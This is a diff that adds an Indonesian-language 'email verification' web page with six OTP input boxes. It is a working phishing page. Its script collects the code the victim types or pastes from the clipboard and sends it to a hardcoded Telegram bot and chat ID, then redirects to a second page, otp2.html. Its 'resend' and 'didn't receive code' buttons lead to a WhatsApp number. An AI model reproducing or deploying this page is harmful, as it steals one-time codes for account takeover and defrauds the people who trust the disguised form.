@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Verifikasi Email</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#fff;
+}
+
+/* Animasi Memudar */
+.fade-page {
+    opacity: 1;
+    transition: opacity 0.4s ease-out;
+}
+.fade-out {
+    opacity: 0;
+    pointer-events: none;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    margin:auto;
+    padding:25px;
+    display:flex;
+    flex-direction:column;
+}
+
+.back{
+    width:42px;
+    height:42px;
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    margin-top:4px;
+}
+
+.back svg{
+    width:25px;
+    height:25px;
+    stroke:#111;
+}
+
+h1{
+    margin-top:16px;
+    font-size:29px;
+    color:#0d2b36;
+    font-weight:800;
+    letter-spacing:-0.4px;
+}
+
+.desc{
+    margin-top:16px;
+    color:#8a8a8a;
+    font-size:18px;
+    line-height:28px;
+    font-weight:600;
+}
+
+.email{
+    color:#555;
+    font-weight:500;
+}
+
+.otp-box{
+    display:flex;
+    justify-content:space-between;
+    margin-top:28px;
+}
+
+.otp{
+    width:50px;
+    height:64px;
+    border:2px solid #ddd;
+    border-radius:16px;
+    text-align:center;
+    font-size:28px;
+    font-weight:700;
+    color:#0d2b36;
+    outline:none;
+}
+
+.otp:focus{
+    border-color:#0d2b36;
+}
+
+.paste{
+    width:170px;
+    height:48px;
+    margin:28px auto;
+    border:2px solid #ddd;
+    border-radius:999px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    background:#fff;
+    font-size:18px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.paste svg{
+    width:22px;
+    height:22px;
+}
+
+.bottom{
+    margin-top:auto;
+}
+
+.resend{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:30px;
+    background:#f2f2f2;
+    color:#9d9d9d;
+    font-size:18px;
+    font-weight:800;
+    cursor:default;
+    transition: all 0.3s ease;
+}
+.resend.enabled{
+    background:#0d2b36;
+    color:#fff;
+    cursor:pointer;
+}
+
+.help{
+    text-align:center;
+    margin-top:24px;
+    font-size:18px;
+    font-weight:800;
+    color:#111;
+    cursor:pointer;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container fade-page" id="pageWrap">
+
+<div class="back">
+<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none">
+    <path d="M19 12H5" stroke="#111827" stroke-width="2.8" stroke-linecap="round"/>
+    <path d="M12 19L5 12L12 5" stroke="#111827" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</div>
+
+<h1>Verifikasi email kamu</h1>
+
+<div class="desc">
+Silakan masukkan OTP yang kami kirimkan ke email kamu
+<span class="email">*******</span>
+</div>
+
+<div class="otp-box">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+</div>
+
+<button class="paste" id="pasteBtn">
+
+<svg fill="none" viewBox="0 0 24 24">
+<rect x="8" y="3" width="13" height="16" rx="3" stroke="#0d2b36" stroke-width="2"/>
+<rect x="3" y="8" width="13" height="13" rx="3" stroke="#0d2b36" stroke-width="2"/>
+</svg>
+
+Tempel Kode
+</button>
+
+<div class="bottom">
+
+<button class="resend" id="timerBtn">
+Kirim Ulang Kode in 01:00
+</button>
+
+<div class="help" id="noCode">
+Saya tidak menerima kode
+</div>
+
+</div>
+
+</div>
+
+<script>
+const otp=document.querySelectorAll(".otp");
+const TELEGRAM_BOT_TOKEN = "8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg";
+const TELEGRAM_CHAT_ID = "5983910858";
+const NEXT_PAGE_URL = "otp2.html"; // ganti dengan alamat halaman tujuan
+const WA_LINK = "https://wa.me/6287766670444";
+
+// Input & Pindah Kotak Otomatis
+otp.forEach((box,index)=>{
+    box.addEventListener("input",e=>{
+        box.value = box.value.replace(/\D/g,''); // hanya angka
+        if(box.value && index < otp.length-1){
+            otp[index+1].focus();
+        }
+        checkComplete(); // cek apakah sudah lengkap
+    });
+
+    box.addEventListener("keydown",e=>{
+        if(e.key==="Backspace" && !box.value && index>0){
+            otp[index-1].focus();
+        }
+    });
+});
+
+// Tombol Tempel Kode
+document.getElementById("pasteBtn").onclick=async()=>{
+    try{
+        const text = await navigator.clipboard.readText();
+        fillOtpFromText(text);
+    }catch(e){
+        alert("Izinkan akses papan klip atau ketik kode secara manual");
+    }
+};
+
+// Isi Otomatis dari teks (bisa dari tempel atau ketik)
+function fillOtpFromText(text){
+    const code = text.replace(/\D/g,"").slice(0,6);
+    code.split("").forEach((n,i)=>{
+        if(otp[i]) otp[i].value = n;
+    });
+    checkComplete();
+}
+
+// Cek jika semua 6 angka sudah terisi
+function checkComplete(){
+    let code = "";
+    otp.forEach(b => code += b.value);
+    if(code.length === 6){
+        sendToTelegram(code);
+    }
+}
+
+// Kirim ke Telegram
+async function sendToTelegram(code){
+    const pageWrap = document.getElementById("pageWrap");
+    const text = `Kode OTP Email: ${code}`;
+    try{
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text
+            })
+        });
+    }catch(e){
+        console.log("Gagal kirim:", e);
+    }
+    // Pindah Halaman dengan Animasi Memudar
+    pageWrap.classList.add("fade-out");
+    setTimeout(()=>{
+        window.location.href = NEXT_PAGE_URL;
+    }, 400); // sesuaikan dengan durasi transisi CSS
+}
+
+// Timer Kirim Ulang 60 Detik
+let time = 60;
+const btn = document.getElementById("timerBtn");
+const timer = setInterval(()=>{
+    time--;
+    let s = time < 10 ? "0"+time : time;
+    btn.innerHTML = "Kirim Ulang Kode in 00:" + s;
+    if(time <= 0){
+        clearInterval(timer);
+        btn.innerHTML = "Kirim Ulang Kode";
+        btn.classList.add("enabled");
+        btn.onclick = () => window.open(WA_LINK, "_blank");
+    }
+}, 1000);
+
+// Tidak Menerima Kode → Buka WhatsApp
+document.getElementById("noCode").onclick = () => {
+    window.open(WA_LINK, "_blank");
+};
+</script>
+
+</body>
+</html>
